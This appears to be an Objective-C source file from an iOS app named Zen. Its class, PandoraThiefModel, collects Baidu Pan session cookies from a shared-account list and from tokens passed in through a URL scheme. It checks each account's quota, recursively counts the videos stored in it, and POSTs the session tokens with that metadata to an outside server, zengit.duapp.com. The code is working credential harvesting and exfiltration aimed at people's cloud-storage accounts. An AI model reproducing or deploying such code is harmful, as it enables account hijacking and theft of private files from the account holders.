//
//  PandoraThiefModel.m
//  Zen
//
//  Created by roger on 14-7-17.
//  Copyright (c) 2014年 Zen. All rights reserved.
//

#import "Singleton.h"
#import "GCDHelper.h"
#import "ZenCategory.h"
#import "PandoraConnection.h"
#import "PandoraThiefModel.h"

#define kPandoraJuanZhiURL @"http://js2.me/share_account_list.php"
#define kPandoraJuanZhiAccountURL @"http://js2.me/share_account_list.php?id=%@"
#define kPandoraQuotaURL @"http://pan.baidu.com/api/quota"
#define kPandoraFileListURL @"http://pan.baidu.com/api/list?order=time&desc=1&web=1&dir=%@"

#define kPandoraURLScheme @"com.zen.pandora://"

@interface PandoraThiefModel () <PandoraConnectionDelegate>
{
    PandoraConnection *_connection;
    NSMutableArray *_accounts;
    int _count;
}

@property (nonatomic, strong) PandoraConnection *connection;

@end

@implementation PandoraThiefModel

SINGLETON_FOR_CLASS(PandoraThiefModel)

- (id)init
{
    self = [super init];
    if (self) {
        _accounts = [[NSMutableArray alloc] init];
    }
    return self;
}

- (BOOL)handleURL:(NSURL *)url
{
    @try {
        NSString *tmp = url.absoluteString;
        if ([tmp contains:kPandoraURLScheme]) {
            NSString *param = [tmp begin:kPandoraURLScheme end:nil];
            if (param) {
                [[NSNotificationCenter defaultCenter] postNotificationName:kPandoraOpenWebView object:self userInfo:@{ @"token" : param, @"url" : @"http://pan.baidu.com/wap/home" }];
            }
        }
    }
    @catch (NSException *exception) {
        NSLog(@"PandoraThiefModel exception: %@", [exception description]);
    }
    
    
    return NO;
}

- (void)run
{
    PandoraConnection *conn = [PandoraConnection connectionWithURL:[NSURL URLWithString:kPandoraJuanZhiURL]];
    conn.delegate = self;
    [conn startAsynchronous];
}

- (void)fetch
{
    [GCDHelper dispatchBlock:^{
        for (NSDictionary *account in _accounts) {
            NSString *url = [NSString stringWithFormat:kPandoraJuanZhiAccountURL, account[@"id"]];
            PandoraConnection *conn = [PandoraConnection connectionWithURL:[NSURL URLWithString:url]];
            NSData *response = [conn startSynchronous];
            [self post:response];
        }
    } complete:^{
        
    }];
}

- (NSString *)tokenForString:(NSString *)cookie
{
    NSArray *array = [cookie componentsSeparatedByString:@";"];
    NSMutableString *result = [[NSMutableString alloc] init];
    for (NSString *sub in array) {
        NSArray *subArray = [sub componentsSeparatedByString:@"|"];
        if ([sub isEqual:[array lastObject]]) {
            [result appendFormat:@"%@=%@", subArray[0], subArray[1]];
        }
        else {
            [result appendFormat:@"%@=%@;", subArray[0], subArray[1]];
        }
        
    }
    return result;
}

- (NSData *)bodyForDict:(NSDictionary *)dict
{
    @try {
        NSMutableDictionary *request = [NSMutableDictionary dictionary];
        request[@"name"] = dict[@"nickname"];
        request[@"description"] = dict[@"description"];
        request[@"quota"] = dict[@"quota"];
        NSString *token = [self tokenForString:dict[@"cookie"]];
        request[@"token"] = token;
        request[@"hash"] = [[NSString stringWithFormat:@"%@-zen", token] md5];
        request[@"type"] = dict[@"type"];
        request[@"quota"] = dict[@"quota"];
        request[@"count"] = dict[@"count"];
        return [NSJSONSerialization dataWithJSONObject:request options:NSJSONWritingPrettyPrinted error:NULL];
    }
    @catch (NSException *exception) {
        NSLog(@"PandoraThiefModel bodyForDict exception: %@", [exception description]);
    }
    return nil;
}

- (long long)quota:(NSString *)token
{
    NSURL *url = [NSURL URLWithString:kPandoraQuotaURL];
    PandoraConnection *conn = [PandoraConnection connectionWithURL:url];
    [conn addRequestHeader:@"Cookie" value:token];
    NSData *response = [conn startSynchronous];
    @try {
        NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:response options:NSJSONReadingAllowFragments error:NULL];
        int error = [dict intForKey:@"errno"];
        if (error == 0) {
            long long used = [dict longLongForKey:@"used"];
            return used;
        }
    }
    @catch (NSException *exception) {
        NSLog(@"PandoraThiefModel quota exception: %@", [exception description]);
    }
    
    return -1;
}

// analyze video num
- (int)analyze:(NSString *)dir token:(NSString *)token
{
    if (!token || [token isEqualToString:@""]) {
        // token is invalid
        NSLog(@"PandoraThiefModel analyze: token is invalid.");
        return -1;
    }
    
    if (!dir || [dir isEqualToString:@""]) {
        // dir is invalid
        NSLog(@"PandoraThiefModel analyze: dir is invalid.");
        return -1;
    }
    
    NSString *url = [NSString stringWithFormat:kPandoraFileListURL, [dir urlEncode]];
    PandoraConnection *conn = [PandoraConnection connectionWithURL:[NSURL URLWithString:url]];
    conn.shouldHandleCookies = NO;
    [conn addRequestHeader:@"Cookie" value:token];
    NSData *response = [conn startSynchronous];
    // NSMutableArray *dirs
    @try {
        NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:response options:NSJSONReadingMutableContainers error:NULL];
        int error = [dict intForKey:@"errno"];
        if (error == 0) {
            NSArray *items = dict[@"list"];
            for (NSDictionary *item in items) {
                int category = [item intForKey:@"category"];
                if (category == 6) {
                    // video
                    _count++;
                }
                else {
                    BOOL isdir = [item intForKey:@"isdir"] == 0? NO : YES;
                    if (isdir) {
                        [self analyze:item[@"path"] token:token];
                    }
                }
            }
        }
    }
    @catch (NSException *exception) {
        
    }
    return 0;
}

- (void)post:(NSData *)data
{
    @try {
        NSMutableDictionary *dict = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:NULL];
        NSString *token = [self tokenForString:dict[@"cookie"]];
        long long quota = [self quota:token];
        if (quota > 0) {
            dict[@"quota"] = [NSNumber numberWithLongLong:quota];
            NSLog(@"post dict: %@", [dict description]);
            _count = 0;
            [self analyze:@"/" token:token];
            dict[@"count"] = [NSNumber numberWithInt:_count];
            //            if (_count < 10) {
            //                // < 10 video just drop it
            //                return;
            //            }
            // post to server
            NSData *body = [self bodyForDict:dict];
            if (body) {
                NSString *url = @"http://zengit.duapp.com/category/add";
                //NSString *url = @"http://127.0.0.1:8080/category/add";
                PandoraConnection *conn = [PandoraConnection connectionWithURL:[NSURL URLWithString:url]];
                conn.httpMethod = @"POST";
                conn.httpBody = body;
                NSData *response = [conn startSynchronous];
                NSDictionary *data = [NSJSONSerialization JSONObjectWithData:response options:NSJSONReadingMutableContainers error:NULL];
                NSLog(@"post response: %@", [data description]);
            }
        }
    }
    @catch (NSException *exception) {
        NSLog(@"PandoraThiefModel post exception: %@", [exception description]);
    }
    
}

- (void)thief:(NSString *)token
{
    [GCDHelper dispatchBlock:^{
        NSMutableDictionary *dict = [NSMutableDictionary dictionary];
        long long quota = [self quota:token];
        _count = 0;
        [self analyze:@"/" token:token];
        dict[@"quota"] = [NSNumber numberWithLongLong:quota];
        dict[@"name"] = @"心里有根刺1997";
        dict[@"description"] = @"我刺视频...";
        dict[@"type"] = [NSNumber numberWithInt:0];
        dict[@"token"] = token;
        dict[@"hash"] = [[NSString stringWithFormat:@"%@-zen", token] md5];
        dict[@"count"] = [NSNumber numberWithInt:_count];
        NSData *body = [NSJSONSerialization dataWithJSONObject:dict options:NSJSONWritingPrettyPrinted error:NULL];
        if (body) {
            NSString *url = @"http://zengit.duapp.com/spurs";
            //NSString *url = @"http://127.0.0.1:8080/spurs";
            PandoraConnection *conn = [PandoraConnection connectionWithURL:[NSURL URLWithString:url]];
            conn.httpMethod = @"POST";
            conn.httpBody = body;
            NSData *response = [conn startSynchronous];
            NSDictionary *data = [NSJSONSerialization JSONObjectWithData:response options:NSJSONReadingMutableContainers error:NULL];
            NSLog(@"post response: %@", [data description]);
        }
    } complete:NULL];
}

#pragma mark
#pragma mark PandoraConnectionDelegate Methods

- (void)requestDidFinished:(PandoraConnection *)connection
{
    @try {
        NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:connection.responseData options:NSJSONReadingAllowFragments error:NULL];
        NSArray *categories = dict[@"data"];
        [_accounts addObjectsFromArray:categories];
        [self fetch];
    }
    @catch (NSException *exception) {
        NSLog(@"PandoraThiefModel requestDidFinished exception: %@", [exception description]);
    }
}

- (void)requestDidFailed:(PandoraConnection *)connection
{
    NSLog(@"PandoraThiefModel network error.");
}

#pragma mark
#pragma mark Utils

+ (NSString *)size:(long long)size
{
    double result = size * 1.0f;
    NSString *suffix = @"B";
    if (result > 1024.0f) {
        suffix = @"KB";
        result = result / 1024.0f; // KB
        if (result > 1024.0f) {
            suffix = @"MB";
            result = result / 1024.0f; // MB
            if (result > 1024.0f) {
                suffix = @"GB";
                result = result/1024.0f; // GB
            }
        }
    }
    return [NSString stringWithFormat:@"%lf %@", result, suffix];
}

@end